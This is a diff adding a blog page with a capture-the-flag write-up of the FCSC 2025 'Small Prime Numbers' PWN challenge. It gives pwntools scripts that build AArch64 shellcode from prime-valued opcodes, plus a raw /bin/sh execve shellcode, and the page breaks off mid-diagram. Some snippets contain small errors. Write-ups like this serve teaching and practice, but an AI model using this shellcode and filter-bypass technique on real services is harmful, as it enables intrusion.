@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>FCSC 2025 - Small Prime Numbers | F0ndueSav0yarde</title>
+<meta name="title" content="FCSC 2025 - Small Prime Numbers" />
+<meta name="description" content="Small Prime Numbers" />
+<meta name="author" content="" />
+<meta name="keywords" content="" />
+
+
+
+
+
+
+  
+  <meta property="og:url" content="/blog/writeups/fcsc_2025_small_prime_numbers/">
+  <meta property="og:site_name" content="F0ndueSav0yarde">
+  <meta property="og:title" content="FCSC 2025 - Small Prime Numbers">
+  <meta property="og:description" content="Small Prime Numbers">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="FCSC 2025 - Small Prime Numbers">
+  <meta name="twitter:description" content="Small Prime Numbers">
+
+
+  
+  
+  <meta itemprop="name" content="FCSC 2025 - Small Prime Numbers">
+  <meta itemprop="description" content="Small Prime Numbers">
+  <meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="wordCount" content="2458">
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/original.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Skip to main content</a>
+
+<a href="/" class="title"><h1>F0ndueSav0yarde</h1></a>
+<nav>
+
+
+
+
+
+
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>FCSC 2025 - Small Prime Numbers</h1>
+
+
+<content>
+  <p><strong>Category : PWN</strong></p>
+<h2 id="phreaks-2600">Phreaks 2600</h2>
+<p>You can find this writeup at <a href="https://phreaks2600.fr/blog/fcsc-2025-small-prime-numbers/">Phreaks 2600 website</a></p>
+<h2 id="context">Context</h2>
+<p>This challenge is a service that accepts and executes a 32 bits Aarch64 shellcode only if each 4 bytes of opcode of the shellcode is a prime number.</p>
+<h2 id="strategy">Strategy</h2>
+<p>Because we need prime numbers, we can ban all 4 bytes of opcodes that are even.
+I wanted to know if it was possible to write anywhere and indeed before the shellcode starts executing, <code>x0</code> value was pointing at an area mapped as RWX.</p>
+<p>I can try pivoting the stack to this address to write my shellcode inside (using <code>mov sp, x0</code>) and <code>branch x0</code> to execute it. But are these opcodes instructions 4-bytes prime numbers ?<br>
+I used this function to be sure :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="n">isprime</span><span class="p">(</span><span class="n">u32</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)))</span></span></span></code></pre></div><ul>
+<li><code>mov sp, x0</code> is a valid instruction !</li>
+<li>But <code>br x0</code> is not…</li>
+</ul>
+<p>I quickly found out that i had to search for an automatic way to write anything anywhere using only prime opcodes…</p>
+<h2 id="semi-automatic-prime-instructions-finder">Semi-automatic prime instructions finder</h2>
+<p>I can point sp to a RWX area (pointed by <code>x0</code>). But can i write inside using only prime opcodes ?<br>
+I used the function above to manually tell if <code>strb &lt;reg&gt;, [sp]</code> (store byte instruction) was prime from <code>x0-w0</code> to <code>x30-w30</code> register range and <code>strb w27, [sp]</code> seems prime !</p>
+<blockquote>
+<p>Notes : it seems that depending on a chosen register, the opcode becomes even or odd. And 4-bytes opcode is always odd when i use <code>w27</code> register so that the instruction could potentially be a prime number !</p>
+</blockquote>
+<p>So i have to control the LSB of <code>w27</code> register.<br>
+With a combination of <code>mov + add + sub</code>, i can theoritically put any 256 bits value in <code>w27</code> register…</p>
+<p>Here is the function i used to get a set of ready-to-use prime opcodes :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">def</span> <span class="nf">generate_all_primes_strb_sp_w27</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">global</span> <span class="n">l1</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">global</span> <span class="n">l2</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">global</span> <span class="n">l3</span> <span class="c1"># sub</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">instruction_1</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;mov w27, #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="n">instruction_2</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;sub w27, w27, #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">instruction_3</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;add w27, w27, #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">i_1</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">instruction_1</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">i_2</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">instruction_2</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">i_3</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">instruction_3</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isprime</span><span class="p">(</span><span class="n">i_1</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="n">l1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">i_1</span><span class="p">,</span><span class="n">instruction_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isprime</span><span class="p">(</span><span class="n">i_2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">l2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">i_2</span><span class="p">,</span><span class="n">instruction_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isprime</span><span class="p">(</span><span class="n">i_3</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">l3</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">i_3</span><span class="p">,</span><span class="n">instruction_3</span><span class="p">)</span></span></span></code></pre></div><p>And its result in <code>l1</code>, <code>l2</code> and <code>l3</code> global dictionnaries :</p>
+
+
+
+
+
+<pre tabindex="0"><code>l1 = {7: (1384120571, &#39;mov w27, #7&#39;), 22: (1384121051, &#39;mov w27, #22&#39;), 28: (1384121243, &#39;mov w27, #28&#39;), 53: (1384122043, &#39;mov w27, #53&#39;), 65: (1384122427, &#39;mov w27, #65&#39;), 67: (1384122491, &#39;mov w27, #67&#39;), 80: (1384122907, &#39;mov w27, #80&#39;), 86: (1384123099, &#39;mov w27, #86&#39;), 97: (1384123451, &#39;mov w27, #97&#39;), 98: (1384123483, &#39;mov w27, #98&#39;), 100: (1384123547, &#39;mov w27, #100&#39;), 122: (1384124251, &#39;mov w27, #122&#39;), 125: (1384124347, &#39;mov w27, #125&#39;), 140: (1384124827, &#39;mov w27, #140&#39;), 143: (1384124923, &#39;mov w27, #143&#39;), 157: (1384125371, &#39;mov w27, #157&#39;), 158: (1384125403, &#39;mov w27, #158&#39;), 160: (1384125467, &#39;mov w27, #160&#39;), 176: (1384125979, &#39;mov w27, #176&#39;), 197: (1384126651, &#39;mov w27, #197&#39;), 202: (1384126811, &#39;mov w27, #202&#39;), 223: (1384127483, &#39;mov w27, #223&#39;), 227: (1384127611, &#39;mov w27, #227&#39;), 235: (1384127867, &#39;mov w27, #235&#39;), 238: (1384127963, &#39;mov w27, #238&#39;), 241: (1384128059, &#39;mov w27, #241&#39;)}
+l2 = {5: (1358960507, &#39;sub w27, w27, #5&#39;), 19: (1358974843, &#39;sub w27, w27, #19&#39;), 20: (1358975867, &#39;sub w27, w27, #20&#39;), 23: (1358978939, &#39;sub w27, w27, #23&#39;), 58: (1359014779, &#39;sub w27, w27, #58&#39;), 59: (1359015803, &#39;sub w27, w27, #59&#39;), 61: (1359017851, &#39;sub w27, w27, #61&#39;), 71: (1359028091, &#39;sub w27, w27, #71&#39;), 73: (1359030139, &#39;sub w27, w27, #73&#39;), 91: (1359048571, &#39;sub w27, w27, #91&#39;), 115: (1359073147, &#39;sub w27, w27, #115&#39;), 118: (1359076219, &#39;sub w27, w27, #118&#39;), 125: (1359083387, &#39;sub w27, w27, #125&#39;), 133: (1359091579, &#39;sub w27, w27, #133&#39;), 143: (1359101819, &#39;sub w27, w27, #143&#39;), 164: (1359123323, &#39;sub w27, w27, #164&#39;), 166: (1359125371, &#39;sub w27, w27, #166&#39;), 170: (1359129467, &#39;sub w27, w27, #170&#39;), 173: (1359132539, &#39;sub w27, w27, #173&#39;), 208: (1359168379, &#39;sub w27, w27, #208&#39;), 223: (1359183739, &#39;sub w27, w27, #223&#39;)}
+l3 = {6: (285219707, &#39;add w27, w27, #6&#39;), 12: (285225851, &#39;add w27, w27, #12&#39;), 32: (285246331, &#39;add w27, w27, #32&#39;), 39: (285253499, &#39;add w27, w27, #39&#39;), 44: (285258619, &#39;add w27, w27, #44&#39;), 54: (285268859, &#39;add w27, w27, #54&#39;), 66: (285281147, &#39;add w27, w27, #66&#39;), 72: (285287291, &#39;add w27, w27, #72&#39;), 75: (285290363, &#39;add w27, w27, #75&#39;), 101: (285316987, &#39;add w27, w27, #101&#39;), 104: (285320059, &#39;add w27, w27, #104&#39;), 105: (285321083, &#39;add w27, w27, #105&#39;), 107: (285323131, &#39;add w27, w27, #107&#39;), 111: (285327227, &#39;add w27, w27, #111&#39;), 114: (285330299, &#39;add w27, w27, #114&#39;), 117: (285333371, &#39;add w27, w27, #117&#39;), 119: (285335419, &#39;add w27, w27, #119&#39;), 122: (285338491, &#39;add w27, w27, #122&#39;), 137: (285353851, &#39;add w27, w27, #137&#39;), 156: (285373307, &#39;add w27, w27, #156&#39;), 159: (285376379, &#39;add w27, w27, #159&#39;), 171: (285388667, &#39;add w27, w27, #171&#39;), 180: (285397883, &#39;add w27, w27, #180&#39;), 186: (285404027, &#39;add w27, w27, #186&#39;), 200: (285418363, &#39;add w27, w27, #200&#39;), 207: (285425531, &#39;add w27, w27, #207&#39;, 209: (285427579, &#39;add w27, w27, #209&#39;), 219: (285437819, &#39;add w27, w27, #219&#39;), 227: (285446011, &#39;add w27, w27, #227&#39;), 240: (285459323, &#39;add w27, w27, #240&#39;)}</code></pre><p>A bunch of data ! To be sure that i can write any byte value i want, i used this function :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">def</span> <span class="nf">can_i_write_any_byte_value</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="n">good</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">            <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l2</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># sub</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">                <span class="k">if</span><span class="p">((</span><span class="n">x</span><span class="o">-</span><span class="n">j</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">                    <span class="n">good</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">                <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">x</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">                    <span class="n">good</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">                <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">g</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">                    <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">x</span><span class="o">+</span><span class="n">k</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                        <span class="n">good</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">good</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Can&#39;t write value &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span></span></span></code></pre></div><p>I can write any 256 bits value i want when using these combinations :</p>
+<ul>
+<li>mov + sub</li>
+<li>mov + add</li>
+<li>mov + add + add</li>
+</ul>
+<h2 id="writing-the-shellcode">Writing the shellcode</h2>
+<p>I have to find a way to write the shellcode and i know that i can write byte by byte. But i have to increment <code>sp</code>.   Luckily, <code>add sp, sp, &lt;imm&gt;</code> and <code>sub sp, sp, &lt;imm&gt;</code> are odd and potentially prime, but <code>add sp, sp, #1</code> isn’t prime…</p>
+<p>I used this function to return a couple of prime instructions to increment <code>sp</code> :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">def</span> <span class="nf">increment_sp</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="n">isprime</span><span class="p">(</span><span class="n">u32</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="n">j</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;add sp,sp,#&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">                <span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;sub sp,sp,#&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="ow">and</span> <span class="n">f</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">                    <span class="k">return</span> <span class="n">a</span><span class="o">+</span><span class="s2">&#34; , &#34;</span><span class="o">+</span><span class="n">s</span></span></span></code></pre></div><p>This function returned</p>
+<ul>
+<li><code>add sp,sp,#6</code></li>
+<li><code>sub sp,sp,#5</code></li>
+</ul>
+<p>Perfect ! I can now use these custom functions below to write my shellcode anywhere.</p>
+<blockquote>
+<p>I used <code>l1</code>, <code>l2</code> and <code>l3</code> dictionnaries generated above</p>
+</blockquote>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">store_sp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;strb w27, [sp]&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">add_sp_1</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add sp, sp, #6&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub sp, sp, #5&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;aarch64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">strb_sp_w27</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l2</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># sub</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="n">j</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">                <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">                <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="n">l1</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># mov</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">for</span> <span class="n">j</span><span class="p">,</span><span class="n">f</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">g</span> <span class="ow">in</span> <span class="n">l3</span><span class="o">.</span><span class="n">items</span><span class="p">():</span> <span class="c1"># add</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">if</span><span class="p">((</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">k</span><span class="p">)</span><span class="o">%</span><span class="mi">256</span> <span class="o">==</span> <span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">                    <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">def</span> <span class="nf">write_byte_with_sp</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">f</span> <span class="o">+=</span> <span class="n">strb_sp_w27</span><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="n">store_sp</span> <span class="o">+</span> <span class="n">add_sp_1</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">return</span> <span class="n">f</span></span></span></code></pre></div><p>And i will use <code>write_byte_with_sp()</code> to automatically write any byte i want. Here is my shellcode :</p>
+
+
+
+
+
+<pre tabindex="0"><code>&#34;&#34;&#34;
+   0:   f28c45e1        movk    x1, #0x622f
+   4:   f2adcd21        movk    x1, #0x6e69, lsl #16
+   8:   f2c5e5e1        movk    x1, #0x2f2f, lsl #32
+   c:   f2ed0e61        movk    x1, #0x6873, lsl #48
+  10:   ca1f03e2        eor     x2, xzr, xzr
+  14:   a8840be1        stp     x1, x2, [sp], #64
+  18:   ca1f03e1        eor     x1, xzr, xzr
+  1c:   d10103e0        sub     x0, sp, #0x40
+  20:   d2801ba8        mov     x8, #0xdd                       // #221
+  24:   d40266e1        svc     #0x1337
+&#34;&#34;&#34;
+
+shellcode = b&#34;\xe1\x45\x8c\xf2\x21\xcd\xad\xf2\xe1\xe5\xc5\xf2\x61\x0e\xed\xf2\xe2\x03\x1f\xca\xe1\x0b\x84\xa8\xe1\x03\x1f\xca\xe0\x03\x01\xd1\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&#34;</code></pre><p>However, i still have to branch <code>x0</code> to execute the shellcode that is freshly written in the area pointed by <code>x0</code> and <code>br x0</code> instruction is not prime…</p>
+<p>I can try to get a suitable value so that <code>add sp, sp &lt;imm&gt;</code> points near the end of the whole payload and so that i can write <code>br x0</code> opcodes in this location. I manually found that <code>0x370</code> is quite good but i have to shift all my payload of 4 bytes. How can i do this ? Using any prime opcode instruction as the first instruction to act like nop ! (Because nop is not prime…)</p>
+<p>I used <code>mov w27, #7</code> (from l1 dictionnary) as the first instruction to be useless and to shift all my payload of 4 bytes so that <code>add sp, sp #0x370</code> points to the near end of the payload. I can then write br <code>x0</code> at this location to jump to my shellcode.</p>
+<h2 id="synchronisation-problem">Synchronisation problem</h2>
+<p>Let’s recap using this layout below :</p>
+
+
+
+
+
+<pre tabindex="0"><code>         +--------------------+                             |
++------&gt; | mov w27, #7        | (nop : start of shellcode)  | &lt;--- x0 points here
+|        +--------------------+                             | 
+|        | start of payload   |                             |
+|        | that will write    |                             | Execution flow
+|        | the shellcode      |                             |
+|        +--------------------+                             | 
++------- | br x0              | written by our payload      |
